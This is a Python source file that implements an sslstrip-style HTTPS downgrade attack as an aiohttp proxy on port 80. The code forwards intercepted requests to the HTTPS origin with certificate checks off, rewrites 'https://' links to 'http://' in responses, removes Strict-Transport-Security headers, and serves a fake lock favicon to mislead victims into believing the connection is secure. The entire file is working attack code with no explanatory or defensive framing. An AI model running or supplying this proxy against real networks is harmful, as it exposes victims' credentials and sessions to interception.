#!/usr/bin/env python3

import asyncio
import aiohttp
from aiohttp import web
import ssl
import logging
import os
import sys

# Configure logging
logging.basicConfig(level=logging.INFO)

# Constants
PORT = 80  # Must be run as root for port 80
LOCK_ICON_PATH = "lock.ico"

# Helper function to clean headers
def clean_headers(headers):
    headers_to_remove = ['accept-encoding', 'if-modified-since', 'cache-control']
    return {k: v for k, v in headers.items() if k.lower() not in headers_to_remove}

# Helper function to get path to lock icon
def get_path_to_lock_icon():
    if os.path.exists(LOCK_ICON_PATH):
        return LOCK_ICON_PATH

    script_path = os.path.abspath(os.path.dirname(sys.argv[0]))
    script_path = os.path.join(script_path, "../share/sslstrip/lock.ico")

    if os.path.exists(script_path):
        return script_path

    logging.warning("Error: Could not find lock.ico")
    return LOCK_ICON_PATH

# Handler for incoming HTTP requests
async def handle_request(request):
    host = request.headers.get('Host')
    if not host:
        return web.Response(status=400, text="No Host header provided.")

    path = request.rel_url.path_qs or "/"
    url = f"https://{host}{path}"
    headers = clean_headers(request.headers)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.request(
                method=request.method,
                url=url,
                headers=headers,
                data=await request.read(),
                allow_redirects=False,
                ssl=False  # Disable SSL verification
            ) as resp:
                # Read and modify HTTPS response
                body = await resp.read()
                body = body.replace(b"https://", b"http://")
                headers = dict(resp.headers)
                headers = {k: v for k, v in headers.items() if k.lower() != 'strict-transport-security'}
                headers['Connection'] = 'close'

                return web.Response(
                    status=resp.status,
                    headers=headers,
                    body=body
                )
    except Exception as e:
        logging.error(f"Proxy error: {e}")
        return web.Response(status=502, text=f"Proxy error: {e}")

# Handler for favicon.ico requests
async def handle_favicon(request):
    try:
        with open(get_path_to_lock_icon(), 'rb') as f:
            icon_data = f.read()
        return web.Response(body=icon_data, content_type='image/x-icon')
    except Exception as e:
        logging.error(f"Error serving favicon: {e}")
        return web.Response(status=404, text="Favicon not found.")

# Main function to start the server
def main():
    app = web.Application()
    app.router.add_route('*', '/favicon.ico', handle_favicon)
    app.router.add_route('*', '/{tail:.*}', handle_request)

    web.run_app(app, host='0.0.0.0', port=PORT)

if __name__ == "__main__":
    main()
